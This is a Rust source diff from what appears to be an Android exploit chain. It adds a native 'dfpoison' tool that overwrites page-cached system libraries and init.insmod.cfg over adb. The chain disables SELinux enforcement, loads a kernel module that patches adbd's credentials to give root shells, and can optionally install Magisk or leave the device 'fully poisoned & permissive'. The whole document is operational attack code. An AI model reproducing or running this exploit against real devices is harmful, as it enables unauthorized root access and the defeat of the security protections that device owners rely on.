@@ -98,6 +98,30 @@ fn poison_batch(adb: &Adb, workdir: &Path, items: &[(String, Vec<u8>, String)]) 
     die(&format!("batch poison failed: ...{}", &out.chars().rev().take(160).collect::<String>().chars().rev().collect::<String>()));
 }
 
+/// Poison one or more files via the NATIVE dfpoison binary (no JVM), reusing the Stager's live SA.
+/// items = [(device_path, spec, tag), ...]. Idempotent + retried like poison_batch.
+fn dfpoison_job(adb: &Adb, workdir: &Path, port: u16, spi: u32, keymat: u8, items: &[(String, Vec<u8>, String)]) {
+    let mut args = format!("/data/local/tmp/dfpoison {} 0x{:x} 0x{:x}", port, spi, keymat);
+    let mut total = 0u64;
+    let mut tags = Vec::new();
+    for (dev, spec, tag) in items {
+        let sp = write_spec(workdir, tag, spec);
+        adb.push(&sp.to_string_lossy(), &format!("/data/local/tmp/{}.spec", tag));
+        args.push_str(&format!(" {} /data/local/tmp/{}.spec", dev, tag));
+        total += (spec.len() / 5) as u64;
+        tags.push(tag.clone());
+    }
+    let mut out = String::new();
+    for attempt in 1..=8 {
+        out = adb.sh(&args);
+        if let Some((w, s)) = parse_ws(&out) {
+            if w + s == total { info(&format!("{}: wrote={} skipped={}{}", tags.join("+"), w, s, if attempt > 1 { format!("  ({} tries)", attempt) } else { String::new() })); return; }
+        }
+        if attempt < 8 { warn(&format!("dfpoison incomplete (attempt {}/8) — retrying  [{}]", attempt, out.lines().last().unwrap_or("").trim())); secs(2); }
+    }
+    die(&format!("dfpoison failed: ...{}", &out.chars().rev().take(160).collect::<String>().chars().rev().collect::<String>()));
+}
+
 // deltas + struct offsets from the target
 fn deltas(t: &Target) -> (i64, i64, i64, i64) {
     (t.hx(&["kernel", "delta_selinux_from_anchor"]),
@@ -144,7 +168,11 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     info(&format!("uid={}  getenforce={}", adb.sh("id -u"), before));
     if before != "Enforcing" { warn(&format!("SELinux already {} (expected Enforcing)", before)); }
     let dex = assets::write_to(&workdir, "e2e.dex", assets::E2E_DEX);
-    adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex"); ok("pushed e2e.dex");
+    adb.push(&dex.to_string_lossy(), "/data/local/tmp/e2e.dex");
+    let dfp = assets::write_to(&workdir, "dfpoison", assets::DFPOISON);
+    adb.push(&dfp.to_string_lossy(), "/data/local/tmp/dfpoison");
+    adb.sh("chmod 755 /data/local/tmp/dfpoison");
+    ok("pushed e2e.dex + dfpoison");
     disable_phantom(&adb);
 
     banner("BUILD  (host)");
@@ -172,7 +200,7 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     let mut orig_las: Vec<u8> = Vec::new();
 
     banner("POISON  (shell -> page caches)");
-    step("inject-lib + libandroid stubs  (batched: one SA/JVM, 2 files)");
+    step("inject-lib + libandroid stubs  (native dfpoison, one SA, 2 files)");
     let (eva_raw, eva_spec, cnts) = build_inject_stub(spi, kmb, port,
         t.hx(&[ik, "stub_gap_off"]) as u64, t.hx(&[ik, "stub_gap_size"]) as usize,
         t.hx(&[ik, "orig_ctor_off"]) as u64, t.hx(&[ik, "init_array_off"]) as u64,
@@ -185,7 +213,7 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
         orig_las = adb.read_region(&t.s(&["libandroid_servers", "device_path"]), t.hx(&["libandroid_servers", "dump_off"]) as u64, las_raw.len());
     }
     info(&format!("inject stub {}B (carrier IVs={}, cfg IVs={}); libas {}B", eva_raw.len(), cnts[0], cnts[1], las_raw.len()));
-    poison_batch(&adb, &workdir, &[
+    dfpoison_job(&adb, &workdir, port, spi, kmb, &[
         (inj_dev_path(t), eva_spec, "inject".into()),
         (t.s(&["libandroid_servers", "device_path"]), las_spec, "libas".into())]);
 
@@ -220,7 +248,9 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     } else {
         err(&format!("getenforce={} (expected Permissive) — chain did not complete", after));
     }
-    stager.stop(); ok("stager stopped (SA reaped)");
+    // adb-root's cfg poison also uses dfpoison against the Stager's SA, so keep it alive until then.
+    let adb_root = cleanup == Cleanup::AdbRoot;
+    if !adb_root { stager.stop(); ok("stager stopped (SA reaped)"); }
 
     match cleanup {
         Cleanup::Reboot => {
@@ -247,8 +277,8 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
             info("READY FOR POST-EX: run with --postex");
         }
         Cleanup::Postex => run_postex_twocarrier(t, &adb, &workdir, ik, eva_stub_len, &orig_las, skip_magisk),
-        Cleanup::AdbRoot => run_adbroot_twocarrier(t, &adb, &workdir),
-        Cleanup::NoRestore => warn("--no-restore: device left fully poisoned & permissive"),
+        Cleanup::AdbRoot => { run_adbroot_twocarrier(t, &adb, &workdir, port, spi, kmb); stager.stop(); ok("stager stopped (SA reaped)"); }
+        Cleanup::NoRestore => { stager.stop(); warn("--no-restore: device left fully poisoned & permissive"); }
     }
 }
 
@@ -291,7 +321,7 @@ fn run_postex_twocarrier(t: &Target, adb: &Adb, workdir: &Path, ik: &str, eva_st
     if ge == "Enforcing" { win(&format!("final getenforce={}  (Magisk policy live if Enforcing)", ge)); } else { warn(&format!("final getenforce={}", ge)); }
 }
 
-fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path) {
+fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path, port: u16, spi: u32, keymat: u8) {
     banner("ADB-ROOT  (cred-patch adbd -> root adb shells, no Magisk)");
     if adb.sh("getenforce") != "Permissive" { die("not permissive — base chain failed; aborting adb-root"); }
     let pid = adbd_pid(adb).unwrap_or_else(|| die("could not find adbd pid"));
@@ -300,8 +330,9 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path) {
     let (credko, cmsg) = build_cred(t, cc, pid.parse().unwrap_or(0), true);
     info(&cmsg);
     push_bytes(adb, workdir, "uv.ko", &credko, "/data/local/tmp/uv.ko");
-    step("Poisoning init.insmod.cfg -> insmod uv.ko (shell, permissive)");
-    poison_cfg_direct(t, adb, workdir, "/data/local/tmp/uv.ko");
+    step("Poisoning init.insmod.cfg -> insmod uv.ko (native dfpoison, Stager SA)");
+    let cfg_spec = cfg_pe_spec(t, "/data/local/tmp/uv.ko");
+    dfpoison_job(adb, workdir, port, spi, keymat, &[(t.s(&["cfg", "device_path"]), cfg_spec, "cfg_pe".into())]);
     step("ctl.start insmod_sh -> loads uv.ko -> cred-patch adbd");
     adb.sh(&format!("setprop ctl.start {}", t.s(&["services", "insmod_sh"])));
     let mut rooted = false;
@@ -312,14 +343,19 @@ fn run_adbroot_twocarrier(t: &Target, adb: &Adb, workdir: &Path) {
     warn("residue (needs reboot): carrier/cfg page-cache poison + loaded modules (exit neutralized, rmmod-safe)");
 }
 
-/// shell-direct cfg poison over the whole inject region (permissive, or shell-readable cfg).
-fn poison_cfg_direct(t: &Target, adb: &Adb, workdir: &Path, insmod_path: &str) {
+/// Build the cfg page-cache poison spec over the whole inject region for an insmod line -> insmod_path.
+fn cfg_pe_spec(t: &Target, insmod_path: &str) -> Vec<u8> {
     let cfg_orig = read_local(&t.local_path(&["cfg", "local_cfg"]));
     let (_c, cfg_want) = build_cfg(cfg_orig, insmod_path, t.hx(&["cfg", "inject_off"]) as usize, t.hx(&["cfg", "inject_len"]) as usize).unwrap_or_else(|e| die(&e));
     let off = t.hx(&["cfg", "inject_off"]) as usize; let ln = t.hx(&["cfg", "inject_len"]) as usize;
     let mut spec = Vec::new();
     for i in off..off + ln { spec.extend_from_slice(&(i as u32).to_le_bytes()); spec.push(cfg_want[i]); }
-    poison(adb, workdir, &t.s(&["cfg", "device_path"]), &spec, "cfg_pe");
+    spec
+}
+
+/// shell-direct cfg poison via the Java Writer (used by --postex, off the hot path).
+fn poison_cfg_direct(t: &Target, adb: &Adb, workdir: &Path, insmod_path: &str) {
+    poison(adb, workdir, &t.s(&["cfg", "device_path"]), &cfg_pe_spec(t, insmod_path), "cfg_pe");
 }
 
 fn stage_postex_assets(adb: &Adb, workdir: &Path) {
